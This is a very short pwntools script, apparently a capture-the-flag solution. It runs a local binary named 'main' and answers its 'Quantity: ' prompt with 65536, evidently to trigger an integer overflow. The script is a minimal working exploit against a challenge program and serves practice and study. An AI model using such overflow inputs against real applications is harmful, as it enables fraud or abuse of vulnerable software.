from pwn import *
p = process("./main")
p.sendlineafter(b"Quantity: ", b"65536")
print(p.recvall().decode())
